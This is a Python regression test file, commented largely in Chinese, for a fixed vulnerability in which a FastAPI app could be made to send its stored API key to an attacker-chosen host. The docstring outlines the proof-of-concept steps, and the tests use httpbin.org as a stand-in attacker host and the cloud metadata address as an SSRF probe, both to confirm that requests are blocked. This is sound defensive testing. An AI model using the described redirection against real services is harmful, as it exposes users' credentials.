"""Regression tests for the round-8 API key exfiltration finding.

PoC that motivated these tests (verified before the fix):
  1. PUT /api/providers with a caller-chosen base_url and no api_key field,
     which preserves the real key already in API/.env
  2. POST /api/canvas-edit, which then attached the stored key as
     `Authorization: Bearer <key>` to the attacker host

The fix binds the key to its host on BOTH the write path (save_providers)
and the use path (execute_canvas_edit), so either alone is sufficient.
"""
import asyncio
import io
import os
import sys
import tempfile
import types
import unittest
from unittest import mock

from fastapi import HTTPException
from fastapi.testclient import TestClient
from PIL import Image

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import core.providers as CP  # noqa: E402
import routers.providers as RP  # noqa: E402
from core.providers import load_api_providers  # noqa: E402

TARGET_HOST = "api-inference.modelscope.cn"
# 必须用可解析的公网域：不可解析域名会被 validate_safe_url 的 DNS 预解析
# 先行拦下，那样测到的就不是"密钥主机绑定"这一层了。
ATTACKER_HOST = "httpbin.org"
ATTACKER_BASE = f"https://{ATTACKER_HOST}/anything/v1"


def _payload_with_base_url(base_url):
    items = []
    for p in load_api_providers():
        d = dict(p)
        if d["id"] == "modelscope":
            d["base_url"] = base_url
        items.append(
            RP.ApiProviderPayload(**{k: v for k, v in d.items() if k in RP.ApiProviderPayload.model_fields})
        )
    return items


class TestKeyExfiltrationRegression(unittest.TestCase):
    """Round 8 CRITICAL: stored API key could be sent to an attacker host."""

    def setUp(self):
        self._tmpdir = tempfile.TemporaryDirectory()
        temp_env = os.path.join(self._tmpdir.name, ".env")
        temp_providers = os.path.join(self._tmpdir.name, "api_providers.json")
        with open(temp_env, "w", encoding="utf-8") as f:
            f.write("MODELSCOPE_API_KEY=ms-synthetic-audit-key-123456\n")
        self._env_patch = mock.patch.dict(os.environ, {"MODELSCOPE_API_KEY": "ms-synthetic-audit-key-123456"}, clear=False)
        self._file_patch_env = mock.patch.object(CP, "API_ENV_FILE", temp_env)
        self._file_patch_prov = mock.patch.object(CP, "API_PROVIDERS_FILE", temp_providers)
        self._env_patch.start()
        self._file_patch_env.start()
        self._file_patch_prov.start()
        CP.invalidate_api_env_cache()
        CP.invalidate_api_providers_cache()
        self.original = {p["id"]: p.get("base_url") for p in load_api_providers()}
        self.modelscope = next((p for p in load_api_providers() if p["id"] == "modelscope"), None)

    def tearDown(self):
        self._file_patch_prov.stop()
        self._file_patch_env.stop()
        self._env_patch.stop()
        CP.invalidate_api_env_cache()
        CP.invalidate_api_providers_cache()
        self._tmpdir.cleanup()

    # ------------------------------------------------------------------
    # 第一层：写入路径（save_providers）
    # ------------------------------------------------------------------

    def test_01_save_providers_rejects_host_change_for_stored_key(self):
        """改写 base_url 时必须拒绝，否则真实 Key 会被指向新主机"""
        before = next(p for p in load_api_providers() if p["id"] == "modelscope")["base_url"]
        with self.assertRaises(HTTPException) as ctx:
            asyncio.run(RP.save_providers(_payload_with_base_url(ATTACKER_BASE)))
        self.assertEqual(ctx.exception.status_code, 400)
        self.assertIn("安全拦截", ctx.exception.detail)
        # 配置必须原封不动
        after = next(p for p in load_api_providers() if p["id"] == "modelscope")["base_url"]
        self.assertEqual(after, before, "base_url 在被拒绝后仍被修改")

    def test_02_save_providers_rejects_private_redirect_and_metadata_but_allows_lan_new_provider(self):
        """双向验证：
        1. 未重填 Key 时将已绑定公网的 Provider 改指内网地址 → 被 check_key_host_binding 拦截；
        2. 云元数据链路本地地址 (169.254.169.254) → 被 validate_safe_url 无条件拦截；
        3. 新增合法局域网自建 Provider (192.168.x.x) → allow_private=True 正常放行。
        """
        for bad in ("http://127.0.0.1:8188/v1", "http://192.168.1.10/v1", "http://localhost/v1"):
            with self.assertRaises(HTTPException, msg=f"未重填 Key 改指 {bad} 应被主机绑定拦截") as ctx:
                asyncio.run(RP.save_providers(_payload_with_base_url(bad)))
            self.assertIn("安全拦截", ctx.exception.detail)

        # 云元数据地址即使作为新平台也必须被 SSRF 拦截
        base_items = _payload_with_base_url(self.original["modelscope"])
        meta_provider = RP.ApiProviderPayload(
            id="evil-meta", name="Meta", base_url="http://169.254.169.254/v1", protocol="openai"
        )
        with self.assertRaises(HTTPException, msg="云元数据地址必须被拦截"):
            asyncio.run(RP.save_providers([*base_items, meta_provider]))

        # 合法局域网自建网关配置必须放行（防回归）
        lan_provider = RP.ApiProviderPayload(
            id="lan-oneapi", name="LAN OneAPI", base_url="http://192.168.1.50:8188/v1", protocol="openai"
        )
        try:
            asyncio.run(RP.save_providers([*base_items, lan_provider]))
        except HTTPException as exc:
            self.fail(f"合法局域网自建 Provider 配置被误拦: {exc.detail}")
        finally:
            asyncio.run(RP.save_providers(base_items))

    def test_03_save_providers_allows_same_host(self):
        """同一 host 的合法保存不得被误伤（防回归：修复不能把功能锁死）"""
        same_host = next(p for p in load_api_providers() if p["id"] == "modelscope")["base_url"]
        try:
            asyncio.run(RP.save_providers(_payload_with_base_url(same_host)))
        except HTTPException as exc:  # pragma: no cover - 仅在意外拦截时失败
            self.fail(f"同一 host 的正常保存被误拦: {exc.detail}")

    # ------------------------------------------------------------------
    # 第二层：使用路径（execute_canvas_edit）——纵深防御
    # ------------------------------------------------------------------

    def test_04_canvas_edit_rechecks_binding_even_if_write_path_bypassed(self):
        """即使绕过写入路径（直接改 API/.env 等），使用前仍必须复核绑定"""
        import core.image_edit as IE

        captured = {}

        class FakeResp:
            status_code = 200

            def raise_for_status(self):
                pass

            def json(self):
                return {"created": 1}

        class FakeAsyncClient:
            def __init__(self, *a, **k):
                pass

            async def __aenter__(self):
                return self

            async def __aexit__(self, *a):
                return False

            async def post(self, url, headers=None, **kw):
                captured["url"] = url
                captured["headers"] = headers or {}
                return FakeResp()

            async def get(self, url, headers=None, **kw):
                return FakeResp()

        fake_httpx = types.ModuleType("httpx")
        fake_httpx.AsyncClient = FakeAsyncClient
        fake_httpx.Timeout = object

        class _HSE(Exception):
            def __init__(self, *a, **k):
                self.response = None

        fake_httpx.HTTPStatusError = _HSE
        fake_httpx.RequestError = Exception
        real_httpx = sys.modules.get("httpx")
        sys.modules["httpx"] = fake_httpx

        # 构造一张 1x1 测试图
        buf = io.BytesIO()
        Image.new("RGB", (8, 8), (10, 20, 30)).save(buf, "PNG")
        src = os.path.join(CP.OUTPUT_DIR, "_keyexfil_probe.png")
        os.makedirs(CP.OUTPUT_DIR, exist_ok=True)
        with open(src, "wb") as f:
            f.write(buf.getvalue())

        # 模拟端点在派发前被篡改到攻击者主机
        real_prepare = IE.prepare_reve_edit_payload

        def tampered_prepare(**kw):
            spec = real_prepare(**kw)
            spec["endpoint_url"] = f"https://{ATTACKER_HOST}/anything/v1/images/generations"
            return spec

        try:
            IE.prepare_reve_edit_payload = tampered_prepare
            with self.assertRaises(HTTPException) as ctx:
                asyncio.run(IE.execute_canvas_edit({
                    "source_image_url": f"/output/{os.path.basename(src)}",
                    "prompt": "x",
                    "provider_id": "modelscope",
                    "model": "Qwen/Qwen-Image",
                }))
            self.assertEqual(ctx.exception.status_code, 400)
            self.assertIn("安全拦截", ctx.exception.detail)
            # 关键断言：请求根本没发出去，密钥不可能泄漏
            self.assertNotIn("headers", captured, "端点被篡改时仍发出了带密钥的请求")
        finally:
            IE.prepare_reve_edit_payload = real_prepare
            sys.modules["httpx"] = real_httpx
            if os.path.isfile(src):
                os.remove(src)

    # ------------------------------------------------------------------
    # 附带的输入校验修复（round 8 MEDIUM）
    # ------------------------------------------------------------------

    def test_05_canvas_edit_rejects_oversized_and_malformed_data_url(self):
        """"data:" 分支此前无上限且未捕获解码异常"""
        from fastapi import FastAPI
        from fastapi.testclient import TestClient
        from routers.online_image import router

        app = FastAPI()
        app.include_router(router)
        client = TestClient(app)

        with client:
            # 缺逗号 → 此前抛 IndexError (500)
            r = client.post("/api/canvas-edit", json={
                "source_image_url": "data:image/png", "prompt": "x",
            })
            self.assertIn(r.status_code, (400, 413), f"期望 400/413，实得 {r.status_code}: {r.text[:200]}")

            # 非法 base64 → 此前抛 binascii.Error (500)
            r = client.post("/api/canvas-edit", json={
                "source_image_url": "data:image/png;base64,!!!not-base64!!!", "prompt": "x",
            })
            self.assertIn(r.status_code, (400, 413), f"期望 400/413，实得 {r.status_code}: {r.text[:200]}")

            # 超大内嵌图 → 此前无任何限制
            from core.image_edit import MAX_DATA_URL_CHARS
            r = client.post("/api/canvas-edit", json={
                "source_image_url": "data:image/png;base64," + "A" * (MAX_DATA_URL_CHARS + 10),
                "prompt": "x",
            })
            self.assertIn(r.status_code, (400, 413), f"期望 400/413，实得 {r.status_code}")

    def test_06_unknown_provider_id_does_not_fall_back_to_primary(self):
        """未知 provider_id 必须 400，而非静默回退到 primary（会泄露其 Key）"""
        from fastapi import FastAPI
        from fastapi.testclient import TestClient
        from routers.online_image import router

        buf = io.BytesIO()
        Image.new("RGB", (8, 8), (10, 20, 30)).save(buf, "PNG")
        src = os.path.join(CP.OUTPUT_DIR, "_keyexfil_probe2.png")
        os.makedirs(CP.OUTPUT_DIR, exist_ok=True)
        with open(src, "wb") as f:
            f.write(buf.getvalue())

        app = FastAPI()
        app.include_router(router)
        client = TestClient(app)
        try:
            with client:
                r = client.post("/api/canvas-edit", json={
                    "source_image_url": f"/output/{os.path.basename(src)}",
                    "prompt": "x",
                    "provider_id": "no-such-provider-xyz",
                })
            self.assertEqual(r.status_code, 400, f"期望 400，实得 {r.status_code}: {r.text[:200]}")
            self.assertIn("未找到 API 平台", r.text)
        finally:
            if os.path.isfile(src):
                os.remove(src)


if __name__ == "__main__":
    unittest.main()